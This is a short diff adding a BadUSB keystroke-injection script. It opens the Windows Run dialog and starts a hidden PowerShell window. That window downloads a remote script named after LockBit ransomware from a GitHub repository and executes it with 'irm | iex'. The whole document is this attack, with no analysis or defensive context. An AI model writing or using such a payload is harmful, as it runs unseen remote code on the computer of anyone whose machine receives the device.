@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "irm 'https://raw.githubusercontent.com/Vinniehat/BadUSB-Scripts/refs/heads/main/lockbit_background_remote.ps1' | iex"
+ENTER
